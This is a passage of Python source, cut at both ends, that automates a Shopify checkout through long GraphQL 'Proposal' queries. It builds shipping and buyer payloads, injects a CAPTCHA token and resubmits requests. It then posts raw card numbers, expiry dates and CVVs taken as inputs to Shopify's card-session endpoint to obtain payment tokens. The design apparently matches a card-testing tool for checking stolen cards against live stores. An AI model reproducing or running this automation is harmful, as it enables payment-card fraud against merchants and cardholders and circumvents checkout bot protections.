currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
                'variables': {
                    'sessionInput': {
                        'sessionToken': sst,
                    },
                    'queueToken': queueToken,
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': street,
                                        'address2': address2,
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        },
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {
                                            'any': True,
                                        },
                                        'shipments': {
                                            'any': True,
                                        },
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {
                                    'any': True,
                                },
                                'deliveryMethodTypes': [
                                    'SHIPPING',
                                ],
                                'expectedTotalPrice': {
                                    'any': True,
                                },
                                'destinationChanged': True,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stableId,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariant/{0}'.format(merch),
                                        'variantId': 'gid://shopify/ProductVariant/{0}'.format(variant_id),
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {
                                    'items': {
                                        'value': 1,
                                    },
                                },
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': subtotal,
                                        'currencyCode': currency,
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'payment': {
                        'totalAmount': {
                            'any': True,
                        },
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '',
                                'city': '',
                                'countryCode': 'US',
                                'lastName': '',
                                'zoneCode': 'ENG',
                                'phone': '',
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': currency,
                            'countryCode': 'US',
                        },
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': 'US',
                        'marketingConsent': [
                            {
                                'email': {
                                    'value': email,
                                },
                            },
                        ],
                        'shopPayOptInPhone': {
                            'countryCode': 'US',
                        },
                        'rememberMe': False,
                    },
                    'tip': {
                        'tipLines': [],
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': '0',
                                'currencyCode': currency,
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {
                        'fields': [],
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {
                        'buyerRefusesDuties': False,
                    },
                },
                'operationName': 'Proposal',
            }
            
            # Add CAPTCHA token to shipping_json if we have one
            if hasattr(self, 'captcha_token') and self.captcha_token:
                shipping_json['variables']['captcha'] = {
                    'provider': self.captcha_type.upper() if hasattr(self, 'captcha_type') else 'HCAPTCHA',
                    'token': self.captcha_token,
                }
                # Only add challenge if it's explicitly required or non-empty
                if hasattr(self, 'captcha_challenge') and self.captcha_challenge:
                    shipping_json['variables']['captcha']['challenge'] = self.captcha_challenge
                
                print(f"[*] Added CAPTCHA token to shipping request")
            
            resp = await self.session.post(graphql_url, json=shipping_json, headers=headers)
            await asyncio.sleep(3)
            resp = await self.session.post(graphql_url, json=shipping_json, headers=headers)
            
            shipping_resp = await resp.json()
            
            # Extract shipping details
            try:
                print(f"[*] Raw shipping response: {str(shipping_resp)[:200]}...")  # Debug print
                
                # Navigate through the response safely
                if 'data' not in shipping_resp:
                    print(f"[!] No 'data' in response: {shipping_resp}")
                    return False, f"Error parsing shipping response - no data", {}
                
                if 'session' not in shipping_resp['data']:
                    print(f"[!] No 'session' in data")
                    return False, f"Error parsing shipping response - no session", {}
                
                if 'negotiate' not in shipping_resp['data']['session']:
                    print(f"[!] No 'negotiate' in session")
                    return False, f"Error parsing shipping response - no negotiate", {}
                
                if 'result' not in shipping_resp['data']['session']['negotiate']:
                    print(f"[!] No 'result' in negotiate")
                    return False, f"Error parsing shipping response - no result", {}
                
                negotiate_result = shipping_resp['data']['session']['negotiate']['result']
                
                if 'sellerProposal' not in negotiate_result:
                    print(f"[!] No 'sellerProposal' in result")
                    return False, f"Error parsing shipping response - no sellerProposal", {}
                
                seller_proposal = negotiate_result['sellerProposal']
                
                # Extract running total
                running_total = "0.00"
                if 'runningTotal' in seller_proposal and 'value' in seller_proposal['runningTotal']:
                    running_total = seller_proposal['runningTotal']['value']['amount']
                
                # Extract delivery information
                delivery_data = seller_proposal.get('delivery', {})
                delivery_strategy = ''
                shipping_amount = 0.0
                
                if delivery_data.get('__typename') == 'PendingTerms':
                    print(f"[*] Delivery terms are pending")
                    delivery_strategy = ''
                    shipping_amount = 0.0
                else:
                    # Try different paths to find delivery strategies
                    delivery_lines = delivery_data.get('deliveryLines', [])
                    if delivery_lines and len(delivery_lines) > 0:
                        first_line = delivery_lines[0]
                        strategies = first_line.get('availableDeliveryStrategies', [])
                        if strategies and len(strategies) > 0:
                            delivery_strategy = strategies[0].get('handle', '')
                            amount_value = strategies[0].get('amount', {}).get('value', {})
                            shipping_amount = float(amount_value.get('amount', 0))
                        else:
                            print(f"[*] No available delivery strategies")
                    else:
                        print(f"[*] No delivery lines found")
                
                # Extract tax amount
                tax_amount = "0.00"
                tax_data = seller_proposal.get('tax', {})
                if tax_data and 'totalTaxAmount' in tax_data:
                    tax_value = tax_data['totalTaxAmount'].get('value', {})
                    tax_amount = tax_value.get('amount', '0.00')
                
                # Extract payment methods
                payment_data = seller_proposal.get('payment', {})
                available_payment_lines = payment_data.get('availablePaymentLines', [])
                
                paymentmethodidentifier = self.extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                if not paymentmethodidentifier and available_payment_lines:
                    # Try to get from the first payment line
                    first_payment = available_payment_lines[0].get('paymentMethod', {})
                    paymentmethodidentifier = first_payment.get('paymentMethodIdentifier', '')
                
                payment_name = "Credit Card"
                if available_payment_lines and len(available_payment_lines) > 0:
                    payment_method = available_payment_lines[0].get('paymentMethod', {})
                    payment_name = payment_method.get('name', 'Credit Card')
                
                print(f"[+] Shipping: ${shipping_amount} | Tax: ${tax_amount} | Total: ${running_total}")
                
            except KeyError as e:
                print(f"[!] KeyError parsing shipping response: {str(e)}")
                print(f"[!] Response structure: {str(shipping_resp.keys()) if shipping_resp else 'None'}")
                return False, f"Error parsing shipping response: {str(e)}", {}
            except Exception as e:
                print(f"[!] Unexpected error parsing shipping response: {str(e)}")
                import traceback
                traceback.print_exc()
                return False, f"Error parsing shipping response: {str(e)}", {}
                
            resp = await self.session.post(graphql_url, json=shipping_json, headers=headers)
            await asyncio.sleep(3)
            resp = await self.session.post(graphql_url, json=shipping_json, headers=headers)
            
            # Debug: Save the raw response
            shipping_text = await resp.text()
            with open('shipping_response.json', 'w', encoding='utf-8') as f:
                f.write(shipping_text[:10000])  # Save first 10000 chars
            print(f"[*] Saved shipping response to shipping_response.json")
            
            shipping_resp = await resp.json()
            
            # STEP 2: PAYMENT PROPOSAL WITH DELIVERY
            print(f"[*] Submitting payment method...")
            
            # Get payment token
            formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            token_payload = {
                "credit_card": {
                    "month": mes,
                    "name": f"{firstName} {lastName}",
                    "number": formatted_card,
                    "verification_value": cvv,
                    "year": ano,
                },
                "payment_session_scope": f"www.{urlparse(base_url).netloc}"
            }
            
            token_resp = await self.session.post('https://deposit.shopifycs.com/sessions', json=token_payload)
            
            try:
                payment_token = (await token_resp.json())['id']
                print(f"[+] Payment token obtained")
            except:
                return False, "Unable to get payment token - Invalid card format", {}
            
            payment_json = {
                'query': 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText 